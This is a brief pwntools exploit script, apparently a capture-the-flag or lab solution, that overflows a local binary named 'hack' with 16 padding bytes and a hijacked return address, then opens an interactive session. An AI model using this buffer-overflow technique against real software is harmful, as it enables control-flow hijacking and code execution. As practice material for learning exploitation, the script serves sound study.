from pwn import *

#run the binary
l = process("./hack")

#gdb_commands = """
#break *0x0040113a
#continue
#"""

#gdb.attach(l, gdbscript=gdb_commands)

exploit = b'A' * 16
exploit += p64(0x0040113a)

l.sendline(exploit)

l.interactive()

